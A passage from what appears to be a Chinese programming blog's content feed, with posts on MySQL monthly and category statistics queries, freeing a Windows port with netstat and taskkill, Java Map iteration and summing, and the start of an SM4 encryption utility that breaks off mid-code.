number">b</span><span class="token punctuation">.</span>age_above_60<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> age60        <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'一月'</span> <span class="token keyword">AS</span> monthNum              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'二月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'三月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'四月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'五月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'六月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'七月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'八月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'九月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'十月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'十一月'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'十二月'</span>             <span class="token punctuation">)</span> <span class="token keyword">AS</span> months                 <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> <span class="token punctuation">(</span>            <span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> MONTH <span class="token punctuation">(</span>f_t_exchanges<span class="token punctuation">.</span>ft_time<span class="token punctuation">)</span> <span class="token keyword">WHEN</span> <span class="token number">1</span> <span class="token keyword">THEN</span> <span class="token string">'一月'</span>        <span class="token keyword">WHEN</span> <span class="token number">2</span> <span class="token keyword">THEN</span> <span class="token string">'二月'</span>        <span class="token keyword">WHEN</span> <span class="token number">3</span> <span class="token keyword">THEN</span> <span class="token string">'三月'</span>        <span class="token keyword">WHEN</span> <span class="token number">4</span> <span class="token keyword">THEN</span> <span class="token string">'四月'</span>        <span class="token keyword">WHEN</span> <span class="token number">5</span> <span class="token keyword">THEN</span> <span class="token string">'五月'</span>        <span class="token keyword">WHEN</span> <span class="token number">6</span> <span class="token keyword">THEN</span> <span class="token string">'六月'</span>        <span class="token keyword">WHEN</span> <span class="token number">7</span> <span class="token keyword">THEN</span> <span class="token string">'七月'</span>        <span class="token keyword">WHEN</span> <span class="token number">8</span> <span class="token keyword">THEN</span> <span class="token string">'八月'</span>        <span class="token keyword">WHEN</span> <span class="token number">9</span> <span class="token keyword">THEN</span> <span class="token string">'九月'</span>        <span class="token keyword">WHEN</span> <span class="token number">10</span> <span class="token keyword">THEN</span> <span class="token string">'十月'</span>        <span class="token keyword">WHEN</span> <span class="token number">11</span> <span class="token keyword">THEN</span> <span class="token string">'十一月'</span>        <span class="token keyword">WHEN</span> <span class="token number">12</span> <span class="token keyword">THEN</span> <span class="token string">'十二月'</span>        <span class="token keyword">END</span>        <span class="token keyword">AS</span> monthTime<span class="token punctuation">,</span>        <span class="token function">SUM</span><span class="token punctuation">(</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> f_t_exchanges_person<span class="token punctuation">.</span>age <span class="token operator">></span> <span class="token number">15</span> <span class="token operator">AND</span> f_t_exchanges_person<span class="token punctuation">.</span>age <span class="token operator">&lt;=</span> <span class="token number">30</span> <span class="token keyword">THEN</span> <span class="token number">1</span> <span class="token keyword">ELSE</span> <span class="token number">0</span> <span class="token keyword">END</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> age_15_30<span class="token punctuation">,</span>        <span class="token function">SUM</span><span class="token punctuation">(</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> f_t_exchanges_person<span class="token punctuation">.</span>age <span class="token operator">></span> <span class="token number">30</span> <span class="token operator">AND</span> f_t_exchanges_person<span class="token punctuation">.</span>age <span class="token operator">&lt;=</span> <span class="token number">45</span> <span class="token keyword">THEN</span> <span class="token number">1</span> <span class="token keyword">ELSE</span> <span class="token number">0</span> <span class="token keyword">END</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> age_30_45<span class="token punctuation">,</span>        <span class="token function">SUM</span><span class="token punctuation">(</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> f_t_exchanges_person<span class="token punctuation">.</span>age <span class="token operator">></span> <span class="token number">45</span> <span class="token operator">AND</span> f_t_exchanges_person<span class="token punctuation">.</span>age <span class="token operator">&lt;=</span> <span class="token number">60</span> <span class="token keyword">THEN</span> <span class="token number">1</span> <span class="token keyword">ELSE</span> <span class="token number">0</span> <span class="token keyword">END</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> age_45_60<span class="token punctuation">,</span>        <span class="token function">SUM</span><span class="token punctuation">(</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> f_t_exchanges_person<span class="token punctuation">.</span>age <span class="token operator">></span> <span class="token number">60</span> <span class="token keyword">THEN</span> <span class="token number">1</span> <span class="token keyword">ELSE</span> <span class="token number">0</span> <span class="token keyword">END</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> age_above_60        <span class="token keyword">FROM</span>        f_t_exchanges        <span class="token keyword">JOIN</span>        f_t_exchanges_person <span class="token keyword">ON</span> f_t_exchanges<span class="token punctuation">.</span>id <span class="token operator">=</span> f_t_exchanges_person<span class="token punctuation">.</span>ft_id        <span class="token keyword">GROUP</span> <span class="token keyword">BY</span>        monthTime<span class="token punctuation">)</span><span class="token number">b</span> <span class="token keyword">on</span> <span class="token number">b</span><span class="token punctuation">.</span>monthTime<span class="token operator">=</span>months<span class="token punctuation">.</span>monthNum        <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">></span></code></pre><ol start="6"><li>赴台形式统计</li></ol><pre class=" language-sql"><code class="language-sql">  <span class="token keyword">select</span> <span class="token number">a</span><span class="token punctuation">.</span>form<span class="token punctuation">,</span> IFNULL<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">.</span>formCount<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> formCount        <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'参观'</span> <span class="token keyword">AS</span> form              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'访问'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'考察'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'采访'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'举办展览会'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'其他'</span><span class="token punctuation">)</span> <span class="token number">a</span>                 <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span><span class="token punctuation">(</span>            <span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> ft_form                       <span class="token keyword">WHEN</span> <span class="token number">1</span> <span class="token keyword">THEN</span> <span class="token string">'参观'</span>                       <span class="token keyword">WHEN</span> <span class="token number">2</span> <span class="token keyword">THEN</span> <span class="token string">'访问'</span>                       <span class="token keyword">WHEN</span> <span class="token number">3</span> <span class="token keyword">THEN</span> <span class="token string">'考察'</span>                       <span class="token keyword">WHEN</span> <span class="token number">4</span> <span class="token keyword">THEN</span> <span class="token string">'采访'</span>                       <span class="token keyword">WHEN</span> <span class="token number">5</span> <span class="token keyword">THEN</span> <span class="token string">'举办展览会'</span>                       <span class="token keyword">WHEN</span> <span class="token number">6</span> <span class="token keyword">THEN</span> <span class="token string">'其他'</span>                       <span class="token keyword">END</span> <span class="token keyword">AS</span> form<span class="token punctuation">,</span>                   <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span>   formCount            <span class="token keyword">FROM</span> f_t_exchanges            <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> form        <span class="token punctuation">)</span> <span class="token number">b</span> <span class="token keyword">ON</span> <span class="token number">b</span><span class="token punctuation">.</span>form <span class="token operator">=</span> <span class="token number">a</span><span class="token punctuation">.</span>form</code></pre><ol start="7"><li>交流类型统计</li></ol><pre class=" language-sql"><code class="language-sql"> <span class="token keyword">select</span> <span class="token number">a</span><span class="token punctuation">.</span><span class="token keyword">type</span><span class="token punctuation">,</span> IFNULL<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">.</span>typeCount<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> typeCount        <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'经贸活动'</span> <span class="token keyword">AS</span> <span class="token keyword">type</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'科技'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'教育'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'体育'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'文化'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'学术'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'卫生'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'新闻'</span>              <span class="token keyword">UNION</span>              <span class="token keyword">SELECT</span> <span class="token string">'其他'</span><span class="token punctuation">)</span> <span class="token number">a</span>                 <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span><span class="token punctuation">(</span>            <span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> ft_type                       <span class="token keyword">WHEN</span> <span class="token number">0</span> <span class="token keyword">THEN</span> <span class="token string">'经贸活动'</span>                       <span class="token keyword">WHEN</span> <span class="token number">1</span> <span class="token keyword">THEN</span> <span class="token string">'科技'</span>                       <span class="token keyword">WHEN</span> <span class="token number">2</span> <span class="token keyword">THEN</span> <span class="token string">'教育'</span>                       <span class="token keyword">WHEN</span> <span class="token number">3</span> <span class="token keyword">THEN</span> <span class="token string">'体育'</span>                       <span class="token keyword">WHEN</span> <span class="token number">4</span> <span class="token keyword">THEN</span> <span class="token string">'文化'</span>                       <span class="token keyword">WHEN</span> <span class="token number">5</span> <span class="token keyword">THEN</span> <span class="token string">'学术'</span>                       <span class="token keyword">WHEN</span> <span class="token number">6</span> <span class="token keyword">THEN</span> <span class="token string">'卫生'</span>                       <span class="token keyword">WHEN</span> <span class="token number">7</span> <span class="token keyword">THEN</span> <span class="token string">'新闻'</span>                       <span class="token keyword">WHEN</span> <span class="token number">8</span> <span class="token keyword">THEN</span> <span class="token string">'其他'</span>                       <span class="token keyword">END</span> <span class="token keyword">AS</span> <span class="token keyword">type</span><span class="token punctuation">,</span>                   <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span>   typeCount            <span class="token keyword">FROM</span> f_t_exchanges            <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> <span class="token keyword">type</span>        <span class="token punctuation">)</span> <span class="token number">b</span> <span class="token keyword">ON</span> <span class="token number">b</span><span class="token punctuation">.</span><span class="token keyword">type</span> <span class="token operator">=</span> <span class="token number">a</span><span class="token punctuation">.</span><span class="token keyword">type</span></code></pre><ol start="8"><li>上报单位类型</li></ol><pre class=" language-sql"><code class="language-sql">        <span class="token keyword">select</span> months<span class="token punctuation">.</span>monthNum<span class="token punctuation">,</span>IFNULL<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">.</span>schoolCount<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> schoolCount<span class="token punctuation">,</span>IFNULL<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">.</span>entCount<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> entCount <span class="token keyword">from</span>            <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'一月'</span> <span class="token keyword">AS</span> monthNum             <span class="token keyword">UNION</span>             <span class="token keyword">SELECT</span> <span class="token string">'二月'</span>             <span class="token keyword">UNION</span>             <span class="token keyword">SELECT</span> <span class="token string">'三月'</span>             <span class="token keyword">UNION</span>             <span class="token keyword">SELECT</span> <span class="token string">'四月'</span>             <span class="token keyword">UNION</span>             <span class="token keyword">SELECT</span> <span class="token string">'五月'</span>             <span class="token keyword">UNION</span>             <span class="token keyword">SELECT</span> <span class="token string">'六月'</span>             <span class="token keyword">UNION</span>             <span class="token keyword">SELECT</span> <span class="token string">'七月'</span>             <span class="token keyword">UNION</span>             <span class="token keyword">SELECT</span> <span class="token string">'八月'</span>             <span class="token keyword">UNION</span>             <span class="token keyword">SELECT</span> <span class="token string">'九月'</span>             <span class="token keyword">UNION</span>             <span class="token keyword">SELECT</span> <span class="token string">'十月'</span>             <span class="token keyword">UNION</span>             <span class="token keyword">SELECT</span> <span class="token string">'十一月'</span>             <span class="token keyword">UNION</span>             <span class="token keyword">SELECT</span> <span class="token string">'十二月'</span>            <span class="token punctuation">)</span> <span class="token keyword">AS</span> months                <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> <span class="token punctuation">(</span>                <span class="token keyword">SELECT</span>                    <span class="token keyword">CASE</span> MONTH<span class="token punctuation">(</span>create_time<span class="token punctuation">)</span>            <span class="token keyword">WHEN</span>  <span class="token number">1</span> <span class="token keyword">THEN</span> <span class="token string">'一月'</span>            <span class="token keyword">WHEN</span>  <span class="token number">2</span> <span class="token keyword">THEN</span> <span class="token string">'二月'</span>            <span class="token keyword">WHEN</span>  <span class="token number">3</span> <span class="token keyword">THEN</span> <span class="token string">'三月'</span>            <span class="token keyword">WHEN</span>  <span class="token number">4</span> <span class="token keyword">THEN</span> <span class="token string">'四月'</span>            <span class="token keyword">WHEN</span>  <span class="token number">5</span> <span class="token keyword">THEN</span> <span class="token string">'五月'</span>            <span class="token keyword">WHEN</span>  <span class="token number">6</span> <span class="token keyword">THEN</span> <span class="token string">'六月'</span>            <span class="token keyword">WHEN</span>  <span class="token number">7</span> <span class="token keyword">THEN</span> <span class="token string">'七月'</span>            <span class="token keyword">WHEN</span>  <span class="token number">8</span> <span class="token keyword">THEN</span> <span class="token string">'八月'</span>            <span class="token keyword">WHEN</span>  <span class="token number">9</span> <span class="token keyword">THEN</span> <span class="token string">'九月'</span>            <span class="token keyword">WHEN</span>  <span class="token number">10</span> <span class="token keyword">THEN</span> <span class="token string">'十月'</span>            <span class="token keyword">WHEN</span>  <span class="token number">11</span> <span class="token keyword">THEN</span> <span class="token string">'十一月'</span>            <span class="token keyword">WHEN</span>  <span class="token number">12</span> <span class="token keyword">THEN</span> <span class="token string">'十二月'</span>                    <span class="token keyword">END</span> <span class="token keyword">AS</span> monthTime<span class="token punctuation">,</span>            <span class="token function">SUM</span><span class="token punctuation">(</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> ent_type <span class="token operator">=</span> <span class="token number">0</span> <span class="token keyword">THEN</span> <span class="token number">1</span> <span class="token keyword">ELSE</span> <span class="token number">0</span> <span class="token keyword">END</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> schoolCount<span class="token punctuation">,</span>            <span class="token function">SUM</span><span class="token punctuation">(</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> ent_type <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">THEN</span> <span class="token number">1</span> <span class="token keyword">ELSE</span> <span class="token number">0</span> <span class="token keyword">END</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> entCount            <span class="token keyword">FROM</span>            f_t_exchanges            <span class="token keyword">GROUP</span> <span class="token keyword">BY</span>            monthTime<span class="token punctuation">)</span>  <span class="token number">b</span> <span class="token keyword">on</span> <span class="token number">b</span><span class="token punctuation">.</span>monthTime<span class="token operator">=</span>months<span class="token punctuation">.</span>monthNum</code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows关闭端口</title>
      <link href="/2022/05/15/windows-duan-kou-guan-bi/"/>
      <url>/2022/05/15/windows-duan-kou-guan-bi/</url>
      
        <content type="html"><![CDATA[<h2 id="Windows关闭端口"><a href="#Windows关闭端口" class="headerlink" title="Windows关闭端口"></a>Windows关闭端口</h2><pre class=" language-cmd"><code class="language-cmd">netstat -ano|findstr 8080   #查看对应端口的pidtaskkill /pid 165376 /F     #终止对应pid的进程</code></pre><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Map相关操作</title>
      <link href="/2022/05/14/map-xiang-guan-cao-zuo/"/>
      <url>/2022/05/14/map-xiang-guan-cao-zuo/</url>
      
        <content type="html"><![CDATA[<h1 id="Map相关操作"><a href="#Map相关操作" class="headerlink" title="Map相关操作"></a>Map相关操作</h1><h2 id="Map遍历"><a href="#Map遍历" class="headerlink" title="Map遍历"></a>Map遍历</h2><ul><li>方法一：普通的foreach循环，使用keySet()方法，遍历key</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span>Integer key<span class="token operator">:</span>map<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"key:"</span><span class="token operator">+</span>key<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span><span class="token string">"Value:"</span><span class="token operator">+</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>简化</p><pre class=" language-java"><code class="language-java">map<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>value<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>方法二：把所有的键值对装入迭代器中，然后遍历迭代器</li></ul><pre class=" language-java"><code class="language-java">Iterator<span class="token operator">&lt;</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span>String<span class="token operator">>></span> it<span class="token operator">=</span>map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>it<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span>String<span class="token operator">></span> entry<span class="token operator">=</span>it<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"key:"</span><span class="token operator">+</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span><span class="token string">"Value:"</span><span class="token operator">+</span>entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>方法三：分别得到key和value</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span>Integer obj <span class="token operator">:</span> map<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"key:"</span><span class="token operator">+</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span>String obj <span class="token operator">:</span> map<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"value:"</span><span class="token operator">+</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>方法四，entrySet()方法</li></ul><pre class=" language-java"><code class="language-java">Set<span class="token operator">&lt;</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span>String<span class="token operator">>></span> entries<span class="token operator">=</span>map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry entry<span class="token operator">:</span>entries<span class="token punctuation">)</span><span class="token punctuation">{</span>     System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"key:"</span><span class="token operator">+</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span><span class="token string">"value:"</span><span class="token operator">+</span>entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Map求和"><a href="#Map求和" class="headerlink" title="Map求和"></a>Map求和</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Integer <span class="token function">mapCount</span><span class="token punctuation">(</span>HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Integer<span class="token operator">></span> map<span class="token punctuation">)</span> <span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> collect <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>x <span class="token operator">-</span><span class="token operator">></span> x<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> collect<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mapToInt</span><span class="token punctuation">(</span>x <span class="token operator">-</span><span class="token operator">></span> x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Map </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国密SM4文件、文本加解密</title>
      <link href="/2022/05/02/guo-mi-sm4-wen-jian-wen-ben-jia-jie-mi/"/>
      <url>/2022/05/02/guo-mi-sm4-wen-jian-wen-ben-jia-jie-mi/</url>
      
        <content type="html"><![CDATA[<h1 id="国密SM4文件、文本加解密"><a href="#国密SM4文件、文本加解密" class="headerlink" title="国密SM4文件、文本加解密"></a>国密SM4文件、文本加解密</h1><pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 国密 sm4 依赖jar包 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>dependency<span class="token operator">></span><span class="token operator">&lt;</span>groupId<span class="token operator">></span>org<span class="token punctuation">.</span>bouncycastle<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span><span class="token operator">&lt;</span>artifactId<span class="token operator">></span>bcprov<span class="token operator">-</span>jdk15on<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span><span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token number">1.68</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span>StandardCharsets<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>Cipher<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>CipherOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>NoSuchPaddingException<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span>SecretKeySpec<span class="token punctuation">;</span><span class="token keyword">import</span> cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileUtil<span class="token punctuation">;</span><span class="token keyword">import</span> cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IoUtil<span class="token punctuation">;</span><span class="token keyword">import</span> lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span>Slf4j<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>bouncycastle<span class="token punctuation">.</span>jcajce<span class="token punctuation">.</span>io<span class="token punctuation">.</span>CipherInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>bouncycastle<span class="token punctuation">.</span>jce<span class="token punctuation">.</span>provider<span class="token punctuation">.</span>BouncyCastleProvider<span class="token punctuation">;</span><span class="token annotation punctuation">@Slf4j</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SM4Tools</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        String sp <span class="token operator">=</span> <span class="token string">"C:\\Users\\Administrator\\Desktop\\原始文件.txt"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//原始文件</span>        String dp <span class="token operator">=</span> <span class="token string">"C:\\Users\\Administrator\\Desktop\\upload\\加密文件.txt"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//加密后文件</span>        String dp2 <span class="token operator">=</span> <span class="token string">"C:\\Users\\Administrator\\Desktop\\upload\\解密成功文件.txt"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//解密后文件</span>        String dp3 <span class="token operator">=</span> <span class="token string">"C:\\Users\\Administrator\\Desktop\\upload\\解密失败文件.txt"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//解密后文件</span>        String key <span class="token operator">=</span> <span class="token string">"40626168"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//加密文件</span>        <span class="token function">encryptFile</span><span class="token punctuation">(</span>sp<span class="token punctuation">,</span> dp<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"加密成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//解密文件</span>        <span class="token function">decryptFile</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> dp2<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"解密成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">decryptFile</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> dp3<span class="token punctuation">,</span> <span class="token 